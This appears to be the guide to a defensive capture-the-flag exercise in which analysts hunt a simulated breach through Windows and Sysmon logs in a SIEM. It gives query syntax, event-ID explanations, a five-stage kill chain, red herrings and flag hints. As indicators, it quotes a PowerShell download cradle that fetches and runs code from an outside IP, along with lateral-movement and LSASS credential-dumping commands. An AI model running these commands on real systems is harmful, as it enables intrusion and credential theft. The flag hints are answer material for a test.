The Scenario

A corporate network was breached over 3 days. The attacker compromised user jmendoza on WORKSTATION-03 via a spear-phishing email containing a malicious Office macro. From there, they enumerated the domain, moved laterally to WORKSTATION-07, dumped credentials, and exfiltrated data to a known Tor exit node.

⚠️
Rabbit holes ahead. The logs contain hundreds of suspicious-looking but completely benign events. Other users run admin commands, PowerShell fires from scheduled tasks, and multiple hosts show unusual-looking activity. Only one user on one host is the real attacker. Correlate carefully.

Quickstart Guide

New to this SIEM? Follow these steps to orient yourself before hunting.

Step 1 — Load the log file

Open the SIEM tool and click Browse File. Select ghost_relay_logs.xml. The parser will ingest all 1,558 events. The header will show the total count once loaded.

Step 2 — Get the lay of the land

Before querying, click the Stats tab. You'll see event ID distribution, host breakdown, and user activity. Notice which host has the most process creation events — that's your starting point.

Step 3 — Run your first query

Type a query in the search bar and press Enter or click ▶ Run:

user CONTAINS "jmendoza"

This shows every event involving the compromised account. Sort by Time to see chronological activity.

Step 4 — Use preset hunts

The toolbar has 17 preset queries covering common attacker TTPs. Click any preset to run it instantly. Good first ones:

  • ⚡ WINWORD spawns cmd — finds the initial macro execution (Act 1)
  • 🌐 C2 Beacon — finds outbound connections to the C2 IP
  • 👤 All jmendoza Events — full attacker timeline

Step 5 — Click any row for details

Click an event row to expand the full detail panel at the bottom. Every field is shown — CommandLine, Hashes, GrantedAccess, etc. Flag-containing events highlight in green.

🏴
Flag format: CTF{...} — flags appear embedded in CommandLine, TargetFilename, or similar fields. The flag tracker in the top-right header auto-detects them as you find events containing them.

Loading Logs

The SIEM accepts Windows Event XML format — the same structure as .evtx exports from Event Viewer or wevtutil.

File format

<!-- Root wrapper -->
<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>1</EventID>
      <TimeCreated SystemTime="2024-03-11T09:14:33.000000+00:00"/>
      <Computer>WORKSTATION-03</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="CommandLine">cmd.exe /c whoami</Data>
      <!-- ... more fields ... -->
    </EventData>
  </Event>
  <!-- ... 1557 more events ... -->
</Events>
ℹ️
The SIEM parses <Data Name="..."> elements and maps them to queryable field names. See the Field Reference for the complete mapping.

Query Syntax

The query engine supports a simple but powerful field-based syntax. Queries run on every loaded event in real time.

Basic structure

FIELD OPERATOR "VALUE"

Combining conditions

Use AND to combine multiple conditions. All conditions must match:

eid = "1" AND host = "WORKSTATION-03" AND user CONTAINS "jmendoza"
⚠️
No OR support yet. To run OR-style searches, use CONTAINS on a common substring, or run multiple separate queries and compare results.

Free-text search

If you type a single word or phrase without a field name, it searches all fields:

psexec               # searches everything for "psexec"
185.220.101.47       # searches all fields for this IP
lsass                # finds anything mentioning lsass

Example Queries

Finding process parent-child relationships

# Find anything that spawned from cmd.exe
parent CONTAINS "cmd.exe" AND eid = "1"

# Find anything spawned by Office apps (initial access indicator)
parent CONTAINS "WINWORD" AND eid = "1"

# PowerShell spawned by a non-standard parent (suspicious)
image CONTAINS "powershell" AND parent NOT CONTAINS "svchost" AND eid = "1"

Hunting encoded PowerShell

# Base64-encoded PS (very suspicious, used for C2 staging)
cmdline CONTAINS "-Enc" AND eid = "1"

# PS with execution policy bypass (common attacker pattern)
cmdline CONTAINS "ExecutionPolicy" AND cmdline CONTAINS "Bypass"

# Hidden window PS — attacker trying to stay invisible
cmdline CONTAINS "-W Hidden"

Lateral movement detection

# WMIC remote execution (common lateral movement)
cmdline CONTAINS "wmic" AND cmdline CONTAINS "/node:"

# PsExec usage
cmdline CONTAINS "psexec"

# Explicit credential logons (pass-the-hash / pass-the-ticket indicator)
eid = "4648"

# Network logon type 3 for jmendoza — is it expected?
eid = "4624" AND user CONTAINS "jmendoza" AND logontype = "3"

Credential dumping

# Any process accessing lsass
eid = "10"

# PROCESS_ALL_ACCESS on lsass (credential dump)
eid = "10" AND access = "0x1FFFFF"

# Procdump / minidump patterns in command lines
cmdline CONTAINS "lsass" AND eid = "1"

# .dmp file creation
eid = "11" AND file ENDSWITH ".dmp"

C2 and exfiltration

# All outbound connections from the attacker host
eid = "3" AND host = "WORKSTATION-03"

# Connections to the known C2
dstip = "185.220.101.47"

# DGA-style domain lookups (short, random-looking domains)
eid = "22" AND host = "WORKSTATION-03"

# Invoke-WebRequest POST (data exfiltration)
cmdline CONTAINS "POST" AND eid = "1"

# 7-Zip compression before exfil
image CONTAINS "7z.exe"

Staging and cleanup

# Files dropped in suspicious locations
eid = "11" AND file CONTAINS "Temp"

# Attacker cleanup (deleting tools)
cmdline CONTAINS "del /f"

# Service installation (PsExec creates PSEXESVC)
eid = "7045"

Sidebar shortcuts

Click any Event ID, Hostname, or Username in the left sidebar to instantly filter to that value. This is the fastest way to drill into a specific host or user's activity.

Sysmon Event IDs

Sysmon (System Monitor) is a Windows service that logs detailed system activity to the Windows Event Log. These are the EIDs you'll encounter in this dataset.

1
Process Creation
Logged every time a new process is created. Contains the full command line, parent process, and file hashes. This is the highest-value event for attacker detection — look for unusual parent-child relationships.
Key fields: Image, CommandLine, ParentImage, Hashes, User
3
Network Connection
Logs every outbound TCP/UDP connection initiated by a process. Contains source and destination IP/port. Use to find C2 beaconing patterns — look for regular intervals, unusual ports, or connections to non-corporate IPs.
Key fields: Image, DestinationIp, DestinationPort, Protocol
10
Process Access
Logged when one process opens a handle to another process. Critical for detecting credential dumping — lsass.exe being accessed with 0x1FFFFF (PROCESS_ALL_ACCESS) is a near-certain credential dump indicator.
Key fields: SourceImage, TargetImage, GrantedAccess, CallTrace
11
File Created
Logged when a file is created or overwritten. Use to track staging — attackers typically drop tools to C:\Windows\Temp\ or C:\Users\...\AppData\. Also catches credential dump output files.
Key fields: Image, TargetFilename, User
22
DNS Query
Logs every DNS query and its result. Use to identify DGA (Domain Generation Algorithm) domains — they look random, are short-lived, and often return NXDOMAIN or C2 IPs. Compare against known-good domain lists.
Key fields: QueryName, QueryResults, Image

Windows Security Event IDs

4624
An account was successfully logged on
Generated for every successful logon. The LogonType field is critical: Type 2 = interactive (keyboard), Type 3 = network (remote share, RPC), Type 10 = remote interactive (RDP). Lateral movement typically produces Type 3.
Key fields: TargetUserName, LogonType, IpAddress, AuthenticationPackage
4648
Logon attempt with explicit credentials
Logged when a process attempts to log on using different credentials (e.g. runas, PsExec with -u, WMIC with /user:). A strong lateral movement indicator, especially when the source process is wmic.exe or psexec.exe.
Key fields: SubjectUserName, TargetUserName, TargetServerName, ProcessName
4688
A new process has been created (Windows Security)
The built-in Windows equivalent of Sysmon EID 1. Less detailed (no file hash, less reliable command line) but present on systems without Sysmon. In this dataset it provides redundant confirmation of attacker activity. Cross-reference with EID 1 for the same timestamp.
Key fields: NewProcessName, CommandLine, ParentProcessName, SubjectUserName

System Event IDs

7045
A new service was installed
Logged in the System channel when a new Windows service is installed. PsExec installs a service called PSEXESVC on the target machine when it runs. This is logged on WORKSTATION-07 — confirming successful lateral movement. The ServiceName and ImagePath fields tell you what was installed.
Key fields: ServiceName, ImagePath, ServiceType, AccountName

Kill Chain

The attack follows the MITRE ATT&CK framework across 5 acts. Each act has specific IOCs and corresponding flags.

1
Initial Access — Spear Phishing
2024-03-11 ~09:14 UTC · WORKSTATION-03 · jmendoza
  • jmendoza opens Q1_Budget_Review_FINAL.docm from Downloads
  • Word macro executes — WINWORD.EXE spawns cmd.exe (Sysmon EID 1)
  • cmd spawns PowerShell with Base64-encoded payload (-Enc flag)
  • Encoded payload: IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage1')
🏴
FLAG 1 is embedded in the CommandLine of the cmd.exe spawned by WINWORD. Query: parent CONTAINS "WINWORD" AND eid = "1"
2
Discovery — Domain Enumeration
2024-03-11 09:16–09:22 UTC · WORKSTATION-03 · jmendoza
  • 11 discovery commands run in rapid succession from the PS session
  • whoami /all, net user jmendoza /domain, net localgroup administrators
  • net group "Domain Admins" /domain, ipconfig /all, systeminfo
  • net view /domain, arp -a, nltest /domain_trusts
  • All spawned as children of PowerShell — look for the burst of EID 1 events
  • A text file is dropped to AppData\Temp containing FLAG 2
🏴
FLAG 2 is in a TargetFilename on Sysmon EID 11. Query: eid = "11" AND file CONTAINS "AppData" AND user CONTAINS "jmendoza"
3
Lateral Movement — WMIC + PsExec
2024-03-11 17:52 UTC · WORKSTATION-03 → WORKSTATION-07
  • WMIC remote execution: wmic /node:WORKSTATION-07 /user:CORP\jmendoza process call create
  • Windows 4648 (explicit cred logon) then 4624 (Type 3 network logon) on WORKSTATION-07
  • PsExec64 dropped to C:\Windows\Temp\psexec64.exe (EID 11)
  • PsExec executed against WORKSTATION-07 with explicit credentials
  • PSEXESVC service installed on WORKSTATION-07 (Windows EID 7045)
  • Post-pivot discovery: whoami, net localgroup, dir C:\Users on WORKSTATION-07
🏴
FLAG 3 is in the PsExec command line. Query: cmdline CONTAINS "psexec" AND eid = "1"
4
Credential Harvesting — LSASS Dump
2024-03-12 02:17 UTC · WORKSTATION-03 · jmendoza
  • Attacker operates at 2 AM to avoid detection
  • pd.exe (procdump) dropped to C:\Windows\Temp\

  • Sysmon EID 10: pd.exe accesses lsass.exe with GrantedAccess=0x1FFFFF
  • lsass.dmp file created (EID 11)
  • Mimikatz-renamed as svchost32.exe executes sekurlsa::logonpasswords
  • FLAG 4 file dropped to Temp by svchost32.exe
🏴
FLAG 4 is in a file created by svchost32.exe. Query: eid = "11" AND image CONTAINS "svchost32"
🔴
Red herring: Windows Defender's MsMpEng.exe also accesses lsass.exe legitimately — check the SourceImage to confirm it's pd.exe, not a security product.

🏴

Rabbit Holes ⚠️

These are events that look alarming but are completely benign. They're designed to waste your time if you don't correlate properly.

🕳️
Key rule: Always check the combination of host + user + parent process + time. An admin running net user on SRV-DC01 at 2 PM is normal. jmendoza running it on WORKSTATION-03 spawned by PowerShell at 9 AM is not.
Suspicious EventWhy It's Actually Benign
reg.exe spawned by svchost.exe Windows scheduled tasks run reg.exe regularly to update run keys. Source is SYSTEM, not a user. Query: image CONTAINS "reg.exe" AND user = "SYSTEM"
PowerShell from svchost.exe Windows Update legitimately spawns PS from svchost. Check the command line — if it contains PSWindowsUpdate or NonInteractive without encoded content, it's WU.
rthomas running wmic on SRV-DC01 Domain admin doing inventory. WMIC without /node: pointing at a workstation is normal admin activity.
asmith running reg/schtasks/netstat Power user doing legitimate sys admin work. The user, host, and timing don't match the attacker profile.
xcopy creating files on SRV-FILE01 asmith copying Q1 report files legitimately. EID 11 on SRV-FILE01 with asmith is expected file server activity.
PowerShell on WORKSTATION-12 Completely different host. The attacker only operates on WORKSTATION-03 and WORKSTATION-07.
Chrome / Edge network connections Normal browsing traffic to Google, Microsoft, CDNs. Hundreds of benign connections.
DNS to Microsoft/Google domains Windows Update, telemetry, browser activity. Only the DGA-looking domains from WORKSTATION-03 are malicious.
Multiple failed/successful logons Normal corporate activity. Focus on jmendoza logon type 3 events on WORKSTATION-07 specifically.

Flags & Hints

There are 5 flags hidden in the log data. Each flag is in CTF{...} format and embedded in a real event field. The SIEM auto-detects flags when you find events containing them.

🏴 FLAG 1
Act 1 · Initial Access

The first flag is in the command line of the process that proves the macro executed and spawned a shell.

💡 Look for a cmd.exe whose parent is a Microsoft Office application. Check the full CommandLine field in the detail panel.
parent CONTAINS "WINWORD" AND eid = "1"
🏴 FLAG 2
Act 2 · Discovery

The attacker's script wrote a file to the temp directory. The filename itself contains the flag.

💡 Search EID 11 for files created by jmendoza. Look in AppData\Local\Temp for an unusual .txt filename.
eid = "11" AND user CONTAINS "jmendoza" AND file CONTAINS "AppData"
🏴 FLAG 3
Act 3 · Lateral Movement

The attacker ran PsExec against the pivot host. The echo command in the PsExec command line contains the flag.

💡 Find the psexec64.exe process creation event. Read the full CommandLine — it includes an echo statement.
image CONTAINS "psexec" AND eid = "1"
🏴 FLAG 4
Act 4 · Credential Harvesting

The renamed Mimikatz binary dropped a results file. The filename of that output file is the flag.

💡 Find EID 11 events from svchost32.exe. That binary is mimikatz renamed — it dropped a .txt file with the flag in the filename.
eid = "11" AND image CONTAINS "svchost32"
🏴 FLAG 5
Act 5 · Exfiltration

The final exfiltration command — an Invoke-WebRequest POST — has the flag embedded in the URL path.

💡 Find the PowerShell process with Invoke-WebRequest and -Method POST in the command line. The URL contains the flag. This is also the event that proves data left the network.
cmdline CONTAINS "POST" AND eid = "1" AND user CONTAINS "jmendoza"

Hunt Playbook

Recommended investigation order for a first-time analyst. Follow these steps to reconstruct the full timeline.

Phase 1 — Triage (5 min)

  1. Load logs, check Stats tab — identify outlier hosts/users by event count
  2. Check Timeline tab — look for spikes in activity (attack bursts)
  3. Run free-text search: jmendoza — confirm the compromised account
  4. Click WORKSTATION-03 in the sidebar to filter to the primary attacker host

Phase 2 — Initial Access (10 min)

  1. Run preset ⚡ WINWORD spawns cmd
  2. Find the EID 1 event with WINWORD as parent — click it to expand detail
  3. Note the timestamp (~09:14 on Day 1) — this anchors your timeline
  4. Run cmdline CONTAINS "-Enc" — identify the encoded PS payload
  5. Decode the Base64 payload to confirm staging URL (it calls back to 185.220.101.47)

Phase 3 — Discovery (10 min)

  1. Run preset 🕵️ Discovery Commands
  2. Sort results by Time — confirm rapid-fire execution (all within 7 minutes)
  3. Note all discovery commands are children of powershell.exe — consistent with in-memory execution
  4. Run eid = "11" AND user CONTAINS "jmendoza" AND file CONTAINS "AppData" for FLAG 2

Phase 4 — Lateral Movement (15 min)

  1. Run cmdline CONTAINS "wmic" AND cmdline CONTAINS "/node:"
  2. Confirm the WMIC command targets WORKSTATION-07
  3. Check EID 4648 and 4624 for WORKSTATION-07 around the same timestamp
  4. Run eid = "11" AND file CONTAINS "psexec" — find the drop event
  5. Run image CONTAINS "psexec" — find execution + FLAG 3
  6. Verify EID 7045 on WORKSTATION-07 confirms PSEXESVC service install

Phase 5 — Credential Harvesting (10 min)

  1. Run preset 💀 LSASS Accessed BY — find EID 10
  2. Confirm GrantedAccess = 0x1FFFFF (PROCESS_ALL_ACCESS — definitive dump)
  3. Run file ENDSWITH ".dmp" to confirm lsass.dmp creation
  4. Run image CONTAINS "svchost32" — find the renamed Mimikatz + FLAG 4
  5. Cross-reference hash against known Mimikatz MD5: 4DD07D953DE0C7F1D6E5A5DB3D9CF9B4

Phase 6 — C2 & Exfil (10 min)

  1. Run preset 🌐 C2 Beacon — view the 28 connections to 185.220.101.47
  2. Switch to Timeline tab — see the regular ~10-min beacon interval on Day 2
  3. Run eid = "22" AND host = "WORKSTATION-03" — find DGA DNS queries
  4. Run image CONTAINS "7z.exe" — find compression event (what was zipped?)
  5. Run preset 📤 Exfil POST — find Invoke-WebRequest + FLAG 5
  6. Run preset 🧹 Attacker Cleanup — confirm which files were deleted

FAQ

Why can't I find any events?

Make sure the log file is loaded (the header shows event count). If you're getting 0 results on a query, check your field name spelling and try removing conditions one at a time to narrow it down.

My query returns too many results

Add more AND conditions to narrow scope. Always add host = "WORKSTATION-03" or user CONTAINS "jmendoza" when hunting attacker activity — most events on other hosts are benign noise.

What's the difference between EID 1 and EID 4688?

Both log process creation. EID 1 is Sysmon (richer data — file hashes, full parent info, ProcessGuid for correlation). EID 4688 is the built-in Windows Security audit (less detail, no hashes). When both exist for the same event, EID 1 is more reliable.

How do I decode the Base64 PowerShell?

Copy the Base64 string after -Enc and decode it as UTF-16LE (Windows uses UTF-16 for PS -EncodedCommand). In CyberChef: use From Base64 then Decode text with UTF-16LE encoding. The decoded command shows the IEX download cradle.

What does GrantedAccess 0x1FFFFF mean?

It's the Windows access mask for PROCESS_ALL_ACCESS — the highest possible access level to a process. When a non-system process (like pd.exe) requests this access to lsass.exe, it's almost always a credential dump attempt. Legitimate access to lsass uses much more restricted masks.

How do I confirm lateral movement actually succeeded?

Look for the combination of: (1) EID 4648 from the source host showing explicit credentials used, then (2) EID 4624 LogonType 3 on the target host from the attacker's source IP shortly after. Then (3) EID 7045 on the target confirming PSEXESVC installed. All three together = confirmed successful lateral movement.
